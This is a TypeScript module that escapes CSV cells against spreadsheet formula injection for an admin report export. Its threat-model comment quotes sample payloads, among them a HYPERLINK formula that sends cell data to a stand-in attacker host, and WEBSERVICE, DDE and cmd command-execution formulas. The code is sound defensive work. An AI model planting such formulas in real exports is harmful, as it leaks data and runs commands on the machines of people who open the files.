/**
 * CSV cell escaping — protects against CSV/spreadsheet formula injection
 * (a.k.a. CSV injection, formula injection, CWE-1236).
 *
 * Threat model
 * ------------
 * When a CSV cell is opened in a spreadsheet app (Excel, LibreOffice,
 * Google Sheets) and the first character is one of:
 *   =  +  -  @
 * the cell is interpreted as a formula. The injected expression then runs
 * in the spreadsheet's evaluation context, which can:
 *   - leak session cookies via `=HYPERLINK("https://attacker/?"&A1, "x")`
 *   - call out to attacker-controlled URLs via `=WEBSERVICE(...)`
 *   - exfiltrate local files via `=DDE(...)` (older Excel)
 *   - corrupt other cells via `=cmd|'/c calc'!A1` (older Office on Windows)
 *   - auto-run on file open (the `=` is the signal — the cell evaluates
 *     when the spreadsheet is first opened)
 *
 * Tab (\t) and carriage-return (\r) are also dangerous because they
 * change cell boundaries / sheet interpretation in some importers.
 *
 * Mitigation
 * ----------
 * The standard mitigation is to prefix a single quote (`'`) to any cell
 * that begins with one of those characters. The single quote is a
 * "text marker" in Excel/LibreOffice — it forces the cell to be treated
 * as a literal string and is hidden in the display.
 *
 * Per RFC 4180, cells that contain commas, double quotes, or newlines
 * MUST be wrapped in double quotes, and any internal double quote must
 * be escaped by doubling it (`"` → `""`).
 *
 * This helper applies BOTH mitigations in one pass.
 *
 * What is NOT escaped
 * -------------------
 * Pure numeric fields (parseable as a finite JS number) are returned
 * as-is when the caller flags them as numeric — formula injection
 * requires a string that the spreadsheet will treat as an expression,
 * and `0.10` does not. When the caller is in doubt, omit the flag and
 * this helper escapes defensively. A value that the caller labeled
 * "numeric" but that doesn't actually parse as a clean number
 * ("not-a-number", "=15") falls through to the text-escape path so the
 * cell is at least formula-injection-safe even though it won't be
 * sortable as a number.
 *
 * Scope in this codebase
 * ----------------------
 * The /admin/reports "Export CSV" endpoint is the primary target. The
 * buildReceiptText() WhatsApp path is NOT a spreadsheet-context vector
 * and uses the same numeric / text as before.
 */
export function escapeCsvCell(value: unknown, opts: { numeric?: boolean } = {}): string {
  // Coerce non-strings. null / undefined become empty cells (RFC 4180).
  if (value === null || value === undefined) return "";
  let str = typeof value === "string" ? value : String(value);

  // Pure numerics: pass through if the caller signals it's safe. This
  // preserves the column as a real number in the spreadsheet (sortable,
  // summable). If the caller is unsure, omit the flag.
  //
  // The check is two-part: a strict regex (so a string like "0x10",
  // "1e5", or "  1 " cannot pass as numeric) AND a Number.isFinite
  // cross-check. If either fails, fall through to the formula-injection
  // mitigation so the cell is at least safe.
  if (opts.numeric) {
    const trimmed = str.trim();
    if (/^-?\d+(\.\d+)?$/.test(trimmed) && Number.isFinite(Number(trimmed))) {
      return trimmed;
    }
    // Fall through: caller said "numeric" but the value isn't actually
    // a clean number — escape defensively rather than smuggle a
    // formula through.
  }

  // Formula-injection prefix: any of =, +, -, @, TAB, CR.
  // The OWASP "CSV Injection" cheat sheet recommends escaping all of
  // these. We prepend a single quote ('); the spreadsheet will display
  // the value as text and not evaluate it as a formula.
  if (/^[=+\-@\t\r]/.test(str)) {
    str = "'" + str;
  }

  // RFC 4180: wrap in double quotes if the cell contains a comma, a
  // double quote, a CR, or an LF. Internal double quotes are doubled.
  if (/[",\r\n]/.test(str)) {
    str = '"' + str.replace(/"/g, '""') + '"';
  }

  return str;
}

/**
 * Serialize an array of row objects to a CSV string with a header row.
 * Header names are escaped the same way (defensive — a header that
 * starts with `=` would be a different kind of disaster).
 *
 * The line terminator is `\r\n` (RFC 4180) so the file opens correctly
 * in Excel on Windows.
 */
export function rowsToCsv<T extends Record<string, unknown>>(
  rows: T[],
  columns: { key: keyof T & string; header: string; numeric?: boolean }[],
): string {
  const escape = (v: unknown, numeric?: boolean) => escapeCsvCell(v, { numeric });
  const headerLine = columns.map((c) => escape(c.header, false)).join(",");
  const bodyLines = rows.map((row) => columns.map((c) => escape(row[c.key], c.numeric)).join(","));
  return [headerLine, ...bodyLines].join("\r\n") + "\r\n";
}
